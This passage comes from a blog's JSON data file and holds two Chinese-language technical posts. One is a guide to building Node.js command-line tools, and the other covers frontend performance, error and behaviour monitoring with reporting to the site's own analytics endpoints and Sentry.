\u547d\u4ee4\u884c\u5de5\u5177\u5f00\u53d1\u6307\u5357","authors":"mason","tags":["Node.js","CLI","\u5de5\u5177"]},"unlisted":false,"prevItem":{"title":"\u6280\u672f\u5199\u4f5c\u6307\u5357","permalink":"/blog/tech-writing"},"nextItem":{"title":"\u524d\u7aef\u76d1\u63a7\u4e0e\u57cb\u70b9\u5b9e\u8df5","permalink":"/blog/frontend-monitoring"}},"content":"\u5f00\u53d1\u547d\u4ee4\u884c\u5de5\u5177\u80fd\u591f\u81ea\u52a8\u5316\u91cd\u590d\u5de5\u4f5c\uff0c\u63d0\u5347\u6548\u7387\u3002\u672c\u6587\u4ecb\u7ecd\u5982\u4f55\u4f7f\u7528 Node.js \u5f00\u53d1 CLI \u5de5\u5177\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u5feb\u901f\u5f00\u59cb\\n\\n### \u9879\u76ee\u521d\u59cb\u5316\\n\\n```bash\\nmkdir my-cli && cd my-cli\\nnpm init -y\\n```\\n\\n### \u9879\u76ee\u7ed3\u6784\\n\\n```\\nmy-cli/\\n\u251c\u2500\u2500 package.json\\n\u251c\u2500\u2500 bin/\\n\u2502   \u2514\u2500\u2500 cli.js          # \u5165\u53e3\u6587\u4ef6\\n\u251c\u2500\u2500 src/\\n\u2502   \u251c\u2500\u2500 commands/       # \u547d\u4ee4\u5b9e\u73b0\\n\u2502   \u2502   \u251c\u2500\u2500 init.js\\n\u2502   \u2502   \u2514\u2500\u2500 build.js\\n\u2502   \u251c\u2500\u2500 utils/          # \u5de5\u5177\u51fd\u6570\\n\u2502   \u2502   \u2514\u2500\u2500 logger.js\\n\u2502   \u2514\u2500\u2500 index.js\\n\u2514\u2500\u2500 README.md\\n```\\n\\n### package.json \u914d\u7f6e\\n\\n```json\\n{\\n  \\"name\\": \\"my-cli\\",\\n  \\"version\\": \\"1.0.0\\",\\n  \\"bin\\": {\\n    \\"mycli\\": \\"./bin/cli.js\\"\\n  },\\n  \\"type\\": \\"module\\",\\n  \\"scripts\\": {\\n    \\"dev\\": \\"node bin/cli.js\\"\\n  },\\n  \\"dependencies\\": {\\n    \\"commander\\": \\"^11.0.0\\",\\n    \\"chalk\\": \\"^5.3.0\\",\\n    \\"inquirer\\": \\"^9.2.0\\",\\n    \\"ora\\": \\"^7.0.0\\"\\n  }\\n}\\n```\\n\\n### \u5165\u53e3\u6587\u4ef6\\n\\n```javascript\\n#!/usr/bin/env node\\n// bin/cli.js\\n\\nimport { program } from \'commander\';\\nimport { init } from \'../src/commands/init.js\';\\nimport { build } from \'../src/commands/build.js\';\\n\\nprogram\\n  .name(\'mycli\')\\n  .description(\'My awesome CLI tool\')\\n  .version(\'1.0.0\');\\n\\nprogram\\n  .command(\'init\')\\n  .description(\'Initialize a new project\')\\n  .option(\'-t, --template <template>\', \'Template to use\', \'default\')\\n  .action(init);\\n\\nprogram\\n  .command(\'build\')\\n  .description(\'Build the project\')\\n  .option(\'-w, --watch\', \'Watch mode\')\\n  .option(\'-o, --output <dir>\', \'Output directory\', \'dist\')\\n  .action(build);\\n\\nprogram.parse();\\n```\\n\\n---\\n\\n## \ud83d\udce6 \u5e38\u7528\u5e93\\n\\n| \u5e93 | \u7528\u9014 | \u8bf4\u660e |\\n|---|------|------|\\n| **commander** | \u547d\u4ee4\u89e3\u6790 | \u5b9a\u4e49\u547d\u4ee4\u548c\u53c2\u6570 |\\n| **inquirer** | \u4ea4\u4e92\u5f0f\u95ee\u7b54 | \u7528\u6237\u8f93\u5165 |\\n| **chalk** | \u5f69\u8272\u8f93\u51fa | \u7f8e\u5316\u7ec8\u7aef\u663e\u793a |\\n| **ora** | \u52a0\u8f7d\u52a8\u753b | \u8fdb\u5ea6\u63d0\u793a |\\n| **fs-extra** | \u6587\u4ef6\u64cd\u4f5c | \u589e\u5f3a\u7248 fs |\\n| **execa** | \u6267\u884c\u547d\u4ee4 | \u8fd0\u884c shell \u547d\u4ee4 |\\n| **glob** | \u6587\u4ef6\u5339\u914d | \u5339\u914d\u6587\u4ef6\u6a21\u5f0f |\\n\\n---\\n\\n## \ud83c\udfa8 \u7ec8\u7aef\u6837\u5f0f\\n\\n### Chalk \u5f69\u8272\u8f93\u51fa\\n\\n```javascript\\nimport chalk from \'chalk\';\\n\\n// \u57fa\u7840\u989c\u8272\\nconsole.log(chalk.red(\'Error!\'));\\nconsole.log(chalk.green(\'Success!\'));\\nconsole.log(chalk.yellow(\'Warning!\'));\\nconsole.log(chalk.blue(\'Info\'));\\n\\n// \u6837\u5f0f\\nconsole.log(chalk.bold(\'Bold text\'));\\nconsole.log(chalk.italic(\'Italic text\'));\\nconsole.log(chalk.underline(\'Underlined\'));\\n\\n// \u80cc\u666f\u8272\\nconsole.log(chalk.bgRed.white(\'Error\'));\\nconsole.log(chalk.bgGreen.black(\'Success\'));\\n\\n// \u7ec4\u5408\\nconsole.log(chalk.red.bold.underline(\'Important!\'));\\n\\n// \u6a21\u677f\u5b57\u7b26\u4e32\\nconsole.log(`\\n  ${chalk.green(\'\u2713\')} Step 1 completed\\n  ${chalk.green(\'\u2713\')} Step 2 completed\\n  ${chalk.yellow(\'\u25cb\')} Step 3 in progress\\n`);\\n```\\n\\n### Ora \u52a0\u8f7d\u52a8\u753b\\n\\n```javascript\\nimport ora from \'ora\';\\n\\nconst spinner = ora(\'Loading...\').start();\\n\\n// \u66f4\u65b0\u6587\u672c\\nspinner.text = \'Installing dependencies...\';\\n\\n// \u6210\u529f\\nspinner.succeed(\'Done!\');\\n\\n// \u5931\u8d25\\nspinner.fail(\'Error occurred\');\\n\\n// \u8b66\u544a\\nspinner.warn(\'Something might be wrong\');\\n\\n// \u4fe1\u606f\\nspinner.info(\'Completed with notes\');\\n\\n// \u505c\u6b62\\nspinner.stop();\\n\\n// \u5b9e\u9645\u4f7f\u7528\\nasync function installDeps() {\\n  const spinner = ora(\'Installing dependencies...\').start();\\n  \\n  try {\\n    await runInstall();\\n    spinner.succeed(\'Dependencies installed\');\\n  } catch (error) {\\n    spinner.fail(\'Failed to install dependencies\');\\n    console.error(error);\\n  }\\n}\\n```\\n\\n---\\n\\n## \ud83d\udcac \u4ea4\u4e92\u5f0f\u95ee\u7b54\\n\\n### Inquirer \u57fa\u672c\u7528\u6cd5\\n\\n```javascript\\nimport inquirer from \'inquirer\';\\n\\n// \u6587\u672c\u8f93\u5165\\nconst { name } = await inquirer.prompt([\\n  {\\n    type: \'input\',\\n    name: \'name\',\\n    message: \'Project name:\',\\n    default: \'my-project\',\\n    validate: (input) => input.length > 0 || \'Name is required\',\\n  }\\n]);\\n\\n// \u5355\u9009\\nconst { framework } = await inquirer.prompt([\\n  {\\n    type: \'list\',\\n    name: \'framework\',\\n    message: \'Select a framework:\',\\n    choices: [\'React\', \'Vue\', \'Angular\', \'Svelte\'],\\n  }\\n]);\\n\\n// \u591a\u9009\\nconst { features } = await inquirer.prompt([\\n  {\\n    type: \'checkbox\',\\n    name: \'features\',\\n    message: \'Select features:\',\\n    choices: [\\n      { name: \'TypeScript\', value: \'ts\', checked: true },\\n      { name: \'ESLint\', value: \'eslint\' },\\n      { name: \'Prettier\', value: \'prettier\' },\\n      { name: \'Testing\', value: \'test\' },\\n    ],\\n  }\\n]);\\n\\n// \u786e\u8ba4\\nconst { confirmed } = await inquirer.prompt([\\n  {\\n    type: \'confirm\',\\n    name: \'confirmed\',\\n    message: \'Are you sure?\',\\n    default: false,\\n  }\\n]);\\n\\n// \u5bc6\u7801\\nconst { password } = await inquirer.prompt([\\n  {\\n    type: \'password\',\\n    name: \'password\',\\n    message: \'Enter password:\',\\n    mask: \'*\',\\n  }\\n]);\\n```\\n\\n### \u6761\u4ef6\u95ee\u9898\\n\\n```javascript\\nconst answers = await inquirer.prompt([\\n  {\\n    type: \'confirm\',\\n    name: \'useTypeScript\',\\n    message: \'Use TypeScript?\',\\n  },\\n  {\\n    type: \'confirm\',\\n    name: \'strict\',\\n    message: \'Enable strict mode?\',\\n    when: (answers) => answers.useTypeScript, // \u6761\u4ef6\u663e\u793a\\n  }\\n]);\\n```\\n\\n---\\n\\n## \ud83d\udcc1 \u6587\u4ef6\u64cd\u4f5c\\n\\n### fs-extra\\n\\n```javascript\\nimport fs from \'fs-extra\';\\n\\n// \u590d\u5236\u6587\u4ef6/\u76ee\u5f55\\nawait fs.copy(\'src\', \'dist\');\\n\\n// \u786e\u4fdd\u76ee\u5f55\u5b58\u5728\\nawait fs.ensureDir(\'dist/assets\');\\n\\n// \u5199\u5165 JSON\\nawait fs.writeJson(\'config.json\', { name: \'my-app\' }, { spaces: 2 });\\n\\n// \u8bfb\u53d6 JSON\\nconst config = await fs.readJson(\'config.json\');\\n\\n// \u79fb\u52a8\\nawait fs.move(\'old-path\', \'new-path\');\\n\\n// \u5220\u9664\\nawait fs.remove(\'dist\');\\n\\n// \u68c0\u67e5\u5b58\u5728\\nconst exists = await fs.pathExists(\'file.txt\');\\n```\\n\\n### \u6a21\u677f\u6587\u4ef6\u5904\u7406\\n\\n```javascript\\nimport fs from \'fs-extra\';\\nimport path from \'path\';\\n\\nasync function copyTemplate(templateDir, targetDir, variables) {\\n  const files = await fs.readdir(templateDir);\\n\\n  for (const file of files) {\\n    const srcPath = path.join(templateDir, file);\\n    const destPath = path.join(targetDir, file);\\n    const stat = await fs.stat(srcPath);\\n\\n    if (stat.isDirectory()) {\\n      await fs.ensureDir(destPath);\\n      await copyTemplate(srcPath, destPath, variables);\\n    } else {\\n      // \u8bfb\u53d6\u5e76\u66ff\u6362\u53d8\u91cf\\n      let content = await fs.readFile(srcPath, \'utf-8\');\\n      \\n      for (const [key, value] of Object.entries(variables)) {\\n        content = content.replace(new RegExp(`{{${key}}}`, \'g\'), value);\\n      }\\n\\n      await fs.writeFile(destPath, content);\\n    }\\n  }\\n}\\n```\\n\\n---\\n\\n## \ud83d\udd27 \u6267\u884c\u547d\u4ee4\\n\\n### Execa\\n\\n```javascript\\nimport { execa, $ } from \'execa\';\\n\\n// \u57fa\u672c\u7528\u6cd5\\nconst { stdout } = await execa(\'npm\', [\'--version\']);\\nconsole.log(\'npm version:\', stdout);\\n\\n// \u7b80\u5199\u8bed\u6cd5\\nconst result = await $`npm install lodash`;\\n\\n// \u6d41\u5f0f\u8f93\u51fa\\nawait execa(\'npm\', [\'install\'], { stdio: \'inherit\' });\\n\\n// \u6355\u83b7\u9519\u8bef\\ntry {\\n  await execa(\'npm\', [\'run\', \'build\']);\\n} catch (error) {\\n  console.error(\'Build failed:\', error.stderr);\\n  process.exit(1);\\n}\\n\\n// \u5728\u7279\u5b9a\u76ee\u5f55\u6267\u884c\\nawait execa(\'npm\', [\'install\'], { cwd: \'./project\' });\\n\\n// \u73af\u5883\u53d8\u91cf\\nawait execa(\'npm\', [\'start\'], {\\n  env: { NODE_ENV: \'production\' }\\n});\\n```\\n\\n---\\n\\n## \ud83c\udfd7\ufe0f \u5b8c\u6574\u793a\u4f8b\\n\\n### init \u547d\u4ee4\\n\\n```javascript\\n// src/commands/init.js\\nimport path from \'path\';\\nimport fs from \'fs-extra\';\\nimport chalk from \'chalk\';\\nimport ora from \'ora\';\\nimport inquirer from \'inquirer\';\\nimport { execa } from \'execa\';\\n\\nexport async function init(options) {\\n  console.log(chalk.blue(\'\\\\n\ud83d\ude80 Create a new project\\\\n\'));\\n\\n  // 1. \u6536\u96c6\u4fe1\u606f\\n  const answers = await inquirer.prompt([\\n    {\\n      type: \'input\',\\n      name: \'name\',\\n      message: \'Project name:\',\\n      default: \'my-project\',\\n      validate: (input) => {\\n        if (!/^[a-z0-9-]+$/.test(input)) {\\n          return \'Name can only contain lowercase letters, numbers, and hyphens\';\\n        }\\n        return true;\\n      },\\n    },\\n    {\\n      type: \'list\',\\n      name: \'template\',\\n      message: \'Select a template:\',\\n      choices: [\'react\', \'vue\', \'vanilla\'],\\n      default: options.template,\\n    },\\n    {\\n      type: \'checkbox\',\\n      name: \'features\',\\n      message: \'Select features:\',\\n      choices: [\\n        { name: \'TypeScript\', value: \'typescript\', checked: true },\\n        { name: \'ESLint\', value: \'eslint\' },\\n        { name: \'Prettier\', value: \'prettier\' },\\n      ],\\n    },\\n  ]);\\n\\n  const projectDir = path.resolve(process.cwd(), answers.name);\\n\\n  // 2. \u68c0\u67e5\u76ee\u5f55\\n  if (await fs.pathExists(projectDir)) {\\n    const { overwrite } = await inquirer.prompt([\\n      {\\n        type: \'confirm\',\\n        name: \'overwrite\',\\n        message: `Directory ${answers.name} already exists. Overwrite?`,\\n        default: false,\\n      },\\n    ]);\\n\\n    if (!overwrite) {\\n      console.log(chalk.yellow(\'Cancelled\'));\\n      return;\\n    }\\n    await fs.remove(projectDir);\\n  }\\n\\n  // 3. \u521b\u5efa\u9879\u76ee\\n  const spinner = ora(\'Creating project...\').start();\\n\\n  try {\\n    await fs.ensureDir(projectDir);\\n\\n    // \u590d\u5236\u6a21\u677f\\n    const templateDir = path.join(__dirname, \'..\', \'templates\', answers.template);\\n    await fs.copy(templateDir, projectDir);\\n\\n    // \u66f4\u65b0 package.json\\n    const pkgPath = path.join(projectDir, \'package.json\');\\n    const pkg = await fs.readJson(pkgPath);\\n    pkg.name = answers.name;\\n    await fs.writeJson(pkgPath, pkg, { spaces: 2 });\\n\\n    spinner.succeed(\'Project created\');\\n\\n    // 4. \u5b89\u88c5\u4f9d\u8d56\\n    spinner.start(\'Installing dependencies...\');\\n    await execa(\'npm\', [\'install\'], { cwd: projectDir });\\n    spinner.succeed(\'Dependencies installed\');\\n\\n    // 5. \u5b8c\u6210\\n    console.log(chalk.green(\'\\\\n\u2728 Done! Now run:\\\\n\'));\\n    console.log(chalk.cyan(`  cd ${answers.name}`));\\n    console.log(chalk.cyan(\'  npm run dev\\\\n\'));\\n  } catch (error) {\\n    spinner.fail(\'Failed to create project\');\\n    console.error(chalk.red(error.message));\\n    process.exit(1);\\n  }\\n}\\n```\\n\\n---\\n\\n## \ud83d\udce6 \u53d1\u5e03\\n\\n### \u672c\u5730\u6d4b\u8bd5\\n\\n```bash\\n# \u94fe\u63a5\u5230\u5168\u5c40\\nnpm link\\n\\n# \u6d4b\u8bd5\u547d\u4ee4\\nmycli --help\\nmycli init\\n\\n# \u53d6\u6d88\u94fe\u63a5\\nnpm unlink\\n```\\n\\n### \u53d1\u5e03\u5230 npm\\n\\n```bash\\n# \u767b\u5f55\\nnpm login\\n\\n# \u53d1\u5e03\\nnpm publish\\n\\n# \u53d1\u5e03 scoped \u5305\\nnpm publish --access public\\n```\\n\\n---\\n\\n## \ud83d\udccb \u6700\u4f73\u5b9e\u8df5\\n\\n```markdown\\n1. \u63d0\u4f9b --help \u548c --version\\n2. \u4f7f\u7528\u5f69\u8272\u8f93\u51fa\u533a\u5206\u4fe1\u606f\u7c7b\u578b\\n3. \u663e\u793a\u8fdb\u5ea6\u548c\u52a0\u8f7d\u72b6\u6001\\n4. \u5904\u7406\u9519\u8bef\u5e76\u7ed9\u51fa\u6709\u7528\u4fe1\u606f\\n5. \u652f\u6301\u914d\u7f6e\u6587\u4ef6\\n6. \u6dfb\u52a0 --verbose \u548c --quiet \u9009\u9879\\n7. \u7f16\u5199\u6e05\u6670\u7684\u6587\u6863\\n```\\n\\n---\\n\\nCLI \u5de5\u5177\u80fd\u591f\u5927\u5e45\u63d0\u5347\u5de5\u4f5c\u6548\u7387\u3002\u4ece\u7b80\u5355\u7684\u811a\u672c\u5f00\u59cb\uff0c\u9010\u6b65\u5b8c\u5584\u529f\u80fd\u3002"},{"id":"frontend-monitoring","metadata":{"permalink":"/blog/frontend-monitoring","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-09-20-frontend-monitoring.md","source":"@site/blog/2024-09-20-frontend-monitoring.md","title":"\u524d\u7aef\u76d1\u63a7\u4e0e\u57cb\u70b9\u5b9e\u8df5","description":"\u524d\u7aef\u76d1\u63a7\u5e2e\u52a9\u6211\u4eec\u4e86\u89e3\u7528\u6237\u884c\u4e3a\u548c\u5e94\u7528\u5065\u5eb7\u72b6\u51b5\u3002\u672c\u6587\u4ecb\u7ecd\u524d\u7aef\u76d1\u63a7\u7684\u6838\u5fc3\u6982\u5ff5\u548c\u5b9e\u73b0\u65b9\u6cd5\u3002","date":"2024-09-20T00:00:00.000Z","tags":[{"inline":true,"label":"\u76d1\u63a7","permalink":"/blog/tags/\u76d1\u63a7"},{"inline":true,"label":"\u57cb\u70b9","permalink":"/blog/tags/\u57cb\u70b9"},{"inline":true,"label":"\u6027\u80fd","permalink":"/blog/tags/\u6027\u80fd"},{"inline":true,"label":"\u524d\u7aef","permalink":"/blog/tags/\u524d\u7aef"}],"readingTime":4.43,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"frontend-monitoring","title":"\u524d\u7aef\u76d1\u63a7\u4e0e\u57cb\u70b9\u5b9e\u8df5","authors":"mason","tags":["\u76d1\u63a7","\u57cb\u70b9","\u6027\u80fd","\u524d\u7aef"]},"unlisted":false,"prevItem":{"title":"Node.js \u547d\u4ee4\u884c\u5de5\u5177\u5f00\u53d1\u6307\u5357","permalink":"/blog/nodejs-cli"},"nextItem":{"title":"WebSocket \u5b9e\u65f6\u901a\u4fe1\u6307\u5357","permalink":"/blog/websocket-guide"}},"content":"\u524d\u7aef\u76d1\u63a7\u5e2e\u52a9\u6211\u4eec\u4e86\u89e3\u7528\u6237\u884c\u4e3a\u548c\u5e94\u7528\u5065\u5eb7\u72b6\u51b5\u3002\u672c\u6587\u4ecb\u7ecd\u524d\u7aef\u76d1\u63a7\u7684\u6838\u5fc3\u6982\u5ff5\u548c\u5b9e\u73b0\u65b9\u6cd5\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u76d1\u63a7\u7c7b\u578b\\n\\n| \u7c7b\u578b | \u5185\u5bb9 | \u4f5c\u7528 |\\n|------|------|------|\\n| **\u6027\u80fd\u76d1\u63a7** | \u52a0\u8f7d\u65f6\u95f4\u3001\u6e32\u67d3\u6027\u80fd | \u4f18\u5316\u7528\u6237\u4f53\u9a8c |\\n| **\u9519\u8bef\u76d1\u63a7** | JS \u9519\u8bef\u3001\u8d44\u6e90\u9519\u8bef | \u5feb\u901f\u5b9a\u4f4d\u95ee\u9898 |\\n| **\u884c\u4e3a\u76d1\u63a7** | \u70b9\u51fb\u3001\u9875\u9762\u8bbf\u95ee | \u4ea7\u54c1\u5206\u6790 |\\n| **\u7528\u6237\u4f53\u9a8c** | \u5361\u987f\u3001\u767d\u5c4f | \u4f53\u9a8c\u4f18\u5316 |\\n\\n---\\n\\n## \ud83d\udcca \u6027\u80fd\u76d1\u63a7\\n\\n### Performance API\\n\\n```javascript\\n// \u5bfc\u822a\u65f6\u95f4\\nconst timing = performance.getEntriesByType(\'navigation\')[0];\\n\\nconst metrics = {\\n  // DNS \u67e5\u8be2\\n  dns: timing.domainLookupEnd - timing.domainLookupStart,\\n  // TCP \u8fde\u63a5\\n  tcp: timing.connectEnd - timing.connectStart,\\n  // \u9996\u5b57\u8282\u65f6\u95f4 (TTFB)\\n  ttfb: timing.responseStart - timing.requestStart,\\n  // \u4e0b\u8f7d\u65f6\u95f4\\n  download: timing.responseEnd - timing.responseStart,\\n  // DOM \u89e3\u6790\\n  domParse: timing.domInteractive - timing.responseEnd,\\n  // DOM \u5b8c\u6210\\n  domComplete: timing.domComplete - timing.domInteractive,\\n  // \u9875\u9762\u5b8c\u5168\u52a0\u8f7d\\n  loadComplete: timing.loadEventEnd - timing.navigationStart,\\n};\\n\\nconsole.log(metrics);\\n```\\n\\n### Core Web Vitals\\n\\n```javascript\\nimport { onLCP, onFID, onCLS, onINP, onFCP, onTTFB } from \'web-vitals\';\\n\\nfunction sendToAnalytics(metric) {\\n  const body = JSON.stringify({\\n    name: metric.name,\\n    value: metric.value,\\n    rating: metric.rating, // \'good\' | \'needs-improvement\' | \'poor\'\\n    id: metric.id,\\n    navigationType: metric.navigationType,\\n  });\\n\\n  // \u4f7f\u7528 sendBeacon \u786e\u4fdd\u6570\u636e\u53d1\u9001\\n  if (navigator.sendBeacon) {\\n    navigator.sendBeacon(\'/analytics\', body);\\n  } else {\\n    fetch(\'/analytics\', { body, method: \'POST\', keepalive: true });\\n  }\\n}\\n\\nonLCP(sendToAnalytics);\\nonFID(sendToAnalytics);\\nonCLS(sendToAnalytics);\\nonINP(sendToAnalytics);\\nonFCP(sendToAnalytics);\\nonTTFB(sendToAnalytics);\\n```\\n\\n### \u8d44\u6e90\u52a0\u8f7d\u76d1\u63a7\\n\\n```javascript\\n// \u76d1\u63a7\u6240\u6709\u8d44\u6e90\u52a0\u8f7d\\nconst resources = performance.getEntriesByType(\'resource\');\\n\\nresources.forEach(resource => {\\n  console.log({\\n    name: resource.name,\\n    type: resource.initiatorType, // script, css, img, fetch...\\n    duration: resource.duration,\\n    size: resource.transferSize,\\n  });\\n});\\n\\n// \u76d1\u63a7\u6162\u8d44\u6e90\\nconst slowResources = resources.filter(r => r.duration > 1000);\\n```\\n\\n---\\n\\n## \u26a0\ufe0f \u9519\u8bef\u76d1\u63a7\\n\\n### \u5168\u5c40\u9519\u8bef\u6355\u83b7\\n\\n```javascript\\n// JS \u8fd0\u884c\u65f6\u9519\u8bef\\nwindow.onerror = function(message, source, lineno, colno, error) {\\n  reportError({\\n    type: \'js_error\',\\n    message,\\n    source,\\n    lineno,\\n    colno,\\n    stack: error?.stack,\\n  });\\n  return false; // \u7ee7\u7eed\u9ed8\u8ba4\u5904\u7406\\n};\\n\\n// Promise \u672a\u6355\u83b7\u9519\u8bef\\nwindow.addEventListener(\'unhandledrejection\', (event) => {\\n  reportError({\\n    type: \'promise_error\',\\n    message: event.reason?.message || String(event.reason),\\n    stack: event.reason?.stack,\\n  });\\n});\\n\\n// \u8d44\u6e90\u52a0\u8f7d\u9519\u8bef\\nwindow.addEventListener(\'error\', (event) => {\\n  if (event.target && (event.target.src || event.target.href)) {\\n    reportError({\\n      type: \'resource_error\',\\n      tagName: event.target.tagName,\\n      url: event.target.src || event.target.href,\\n    });\\n  }\\n}, true); // \u6355\u83b7\u9636\u6bb5\\n```\\n\\n### React \u9519\u8bef\u8fb9\u754c\\n\\n```tsx\\nimport React, { Component, ErrorInfo, ReactNode } from \'react\';\\n\\ninterface Props {\\n  children: ReactNode;\\n  fallback?: ReactNode;\\n}\\n\\ninterface State {\\n  hasError: boolean;\\n  error?: Error;\\n}\\n\\nclass ErrorBoundary extends Component<Props, State> {\\n  state: State = { hasError: false };\\n\\n  static getDerivedStateFromError(error: Error): State {\\n    return { hasError: true, error };\\n  }\\n\\n  componentDidCatch(error: Error, errorInfo: ErrorInfo) {\\n    reportError({\\n      type: \'react_error\',\\n      message: error.message,\\n      stack: error.stack,\\n      componentStack: errorInfo.componentStack,\\n    });\\n  }\\n\\n  render() {\\n    if (this.state.hasError) {\\n      return this.props.fallback || <div>Something went wrong</div>;\\n    }\\n    return this.props.children;\\n  }\\n}\\n```\\n\\n### \u63a5\u53e3\u9519\u8bef\u76d1\u63a7\\n\\n```javascript\\n// \u62e6\u622a fetch\\nconst originalFetch = window.fetch;\\nwindow.fetch = async function(...args) {\\n  const startTime = Date.now();\\n  \\n  try {\\n    const response = await originalFetch.apply(this, args);\\n    \\n    // \u8bb0\u5f55\u8bf7\u6c42\\n    reportApi({\\n      url: args[0],\\n      method: args[1]?.method || \'GET\',\\n      status: response.status,\\n      duration: Date.now() - startTime,\\n      success: response.ok,\\n    });\\n\\n    return response;\\n  } catch (error) {\\n    reportApi({\\n      url: args[0],\\n      method: args[1]?.method || \'GET\',\\n      status: 0,\\n      duration: Date.now() - startTime,\\n      success: false,\\n      error: error.message,\\n    });\\n    throw error;\\n  }\\n};\\n```\\n\\n---\\n\\n## \ud83d\udcc8 \u884c\u4e3a\u76d1\u63a7\\n\\n### \u9875\u9762\u8bbf\u95ee (PV/UV)\\n\\n```javascript\\n// \u9875\u9762\u8bbf\u95ee\\nfunction trackPageView() {\\n  report({\\n    type: \'pageview\',\\n    url: location.href,\\n    referrer: document.referrer,\\n    title: document.title,\\n    timestamp: Date.now(),\\n  });\\n}\\n\\n// SPA \u8def\u7531\u53d8\u5316\\nwindow.addEventListener(\'popstate\', trackPageView);\\n\\n// \u5982\u679c\u4f7f\u7528 React Router\\nuseEffect(() => {\\n  trackPageView();\\n}, [location.pathname]);\\n```\\n\\n### \u70b9\u51fb\u4e8b\u4ef6\\n\\n```javascript\\n// \u81ea\u52a8\u91c7\u96c6\u70b9\u51fb\\ndocument.addEventListener(\'click\', (event) => {\\n  const target = event.target;\\n  \\n  // \u83b7\u53d6\u5143\u7d20\u4fe1\u606f\\n  const elementInfo = {\\n    tagName: target.tagName,\\n    id: target.id,\\n    className: target.className,\\n    text: target.innerText?.slice(0, 50),\\n    path: getElementPath(target),\\n  };\\n\\n  report({\\n    type: \'click\',\\n    ...elementInfo,\\n    x: event.clientX,\\n    y: event.clientY,\\n    timestamp: Date.now(),\\n  });\\n}, true);\\n\\n// \u83b7\u53d6\u5143\u7d20\u8def\u5f84\\nfunction getElementPath(element) {\\n  const path = [];\\n  while (element && element !== document.body) {\\n    let selector = element.tagName.toLowerCase();\\n    if (element.id) {\\n      selector += `#${element.id}`;\\n    } else if (element.className) {\\n      selector += `.${element.className.split(\' \').join(\'.\')}`;\\n    }\\n    path.unshift(selector);\\n    element = element.parentElement;\\n  }\\n  return path.join(\' > \');\\n}\\n```\\n\\n### \u624b\u52a8\u57cb\u70b9\\n\\n```javascript\\n// \u57cb\u70b9 SDK\\nconst tracker = {\\n  track(eventName, properties = {}) {\\n    report({\\n      type: \'event\',\\n      event: eventName,\\n      properties,\\n      timestamp: Date.now(),\\n    });\\n  },\\n\\n  // \u9884\u8bbe\u4e8b\u4ef6\\n  trackButtonClick(buttonName) {\\n    this.track(\'button_click\', { button: buttonName });\\n  },\\n\\n  trackFormSubmit(formName, success) {\\n    this.track(\'form_submit\', { form: formName, success });\\n  },\\n\\n  trackSearch(keyword, resultCount) {\\n    this.track(\'search\', { keyword, resultCount });\\n  },\\n};\\n\\n// \u4f7f\u7528\\ntracker.track(\'add_to_cart\', { productId: \'123\', price: 99 });\\ntracker.trackButtonClick(\'checkout\');\\n```\\n\\n---\\n\\n## \ud83d\udce4 \u6570\u636e\u4e0a\u62a5\\n\\n### \u4e0a\u62a5\u7b56\u7565\\n\\n```javascript\\nclass Reporter {\\n  private queue: any[] = [];\\n  private maxBatchSize = 10;\\n  private flushInterval = 5000;\\n  private timer?: NodeJS.Timer;\\n\\n  constructor() {\\n    this.startTimer();\\n    \\n    // \u9875\u9762\u5378\u8f7d\u524d\u4e0a\u62a5\\n    window.addEventListener(\'beforeunload\', () => this.flush());\\n    document.addEventListener(\'visibilitychange\', () => {\\n      if (document.visibilityState === \'hidden\') {\\n        this.flush();\\n      }\\n    });\\n  }\\n\\n  private startTimer() {\\n    this.timer = setInterval(() => this.flush(), this.flushInterval);\\n  }\\n\\n  report(data: any) {\\n    this.queue.push({\\n      ...data,\\n      timestamp: Date.now(),\\n      url: location.href,\\n      userAgent: navigator.userAgent,\\n    });\\n\\n    if (this.queue.length >= this.maxBatchSize) {\\n      this.flush();\\n    }\\n  }\\n\\n  private flush() {\\n    if (this.queue.length === 0) return;\\n\\n    const data = this.queue.splice(0, this.maxBatchSize);\\n    this.send(data);\\n  }\\n\\n  private send(data: any[]) {\\n    const body = JSON.stringify(data);\\n\\n    // \u4f18\u5148\u4f7f\u7528 sendBeacon\\n    if (navigator.sendBeacon) {\\n      navigator.sendBeacon(\'/api/track\', body);\\n    } else {\\n      fetch(\'/api/track\', {\\n        method: \'POST\',\\n        body,\\n        keepalive: true,\\n      });\\n    }\\n  }\\n}\\n\\nconst reporter = new Reporter();\\n```\\n\\n### \u91c7\u6837\\n\\n```javascript\\n// \u6309\u6bd4\u4f8b\u91c7\u6837\\nfunction shouldSample(sampleRate = 0.1) {\\n  return Math.random() < sampleRate;\\n}\\n\\n// \u4f7f\u7528\\nif (shouldSample(0.1)) { // 10% \u91c7\u6837\\n  reporter.report(data);\\n}\\n```\\n\\n---\\n\\n## \ud83d\udee0\ufe0f \u5f00\u6e90\u65b9\u6848\\n\\n| \u65b9\u6848 | \u7c7b\u578b | \u7279\u70b9 |\\n|------|------|------|\\n| **Sentry** | \u9519\u8bef\u76d1\u63a7 | \u529f\u80fd\u5f3a\u5927\uff0c\u751f\u6001\u4e30\u5bcc |\\n| **LogRocket** | \u5168\u529f\u80fd | \u4f1a\u8bdd\u56de\u653e |\\n| **Mixpanel** | \u884c\u4e3a\u5206\u6790 | \u4ea7\u54c1\u5206\u6790 |\\n| **Google Analytics** | \u884c\u4e3a\u5206\u6790 | \u514d\u8d39\uff0c\u529f\u80fd\u5168 |\\n| **\u81ea\u5efa** | \u5168\u529f\u80fd | \u53ef\u63a7\uff0c\u5b9a\u5236\u5316 |\\n\\n### Sentry \u96c6\u6210\\n\\n```javascript\\nimport * as Sentry from \'@sentry/react\';\\n\\nSentry.init({\\n  dsn: \'your-dsn\',\\n  environment: process.env.NODE_ENV,\\n  release: \'my-app@1.0.0\',\\n  tracesSampleRate: 0.1,\\n  integrations: [\\n    new Sentry.BrowserTracing(),\\n    new Sentry.Replay(),\\n  ],\\n});\\n\\n// \u624b\u52a8\u4e0a\u62a5\\nSentry.captureException(error);\\nSentry.captureMessage(\'Something happened\');\\n\\n// \u6dfb\u52a0\u4e0a\u4e0b\u6587\\nSentry.setUser({ id: user.id, email: user.email });\\nSentry.setTag(\'page\', 